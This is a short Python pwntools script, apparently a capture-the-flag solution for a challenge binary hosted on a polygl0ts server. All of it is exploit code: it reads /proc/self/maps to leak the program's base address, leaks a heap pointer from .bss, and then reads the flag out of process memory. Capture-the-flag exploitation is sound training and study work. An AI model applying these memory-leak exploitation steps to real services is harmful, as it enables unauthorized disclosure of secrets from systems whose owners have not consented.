#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./capture-the-flaaaaaaaaaaaaag", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    nc = "nc chall.polygl0ts.ch 9003"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

io.sendline(b"3")
io.sendline(b"\n")


io.sendline(b"1 /proc/self/maps")
io.recvuntil(b"filename > ")
elf.address = int(io.recvuntil(b"-", drop=True), 16)
log.info(f"{elf.address=:#x}")

io.sendline(f"2 {elf.bss(0x30):x}".encode())
io.recvuntil(b"address > ")
heap_leak = u64(io.recv(6) + b"\x00" * 2)
log.info(f"{heap_leak=:#x}")

io.sendline(f"2 {heap_leak+2:x}".encode())
io.recvuntil(b"address > ")
flag = io.recvline().strip().decode()
print(f"EP{flag}")

io.close()
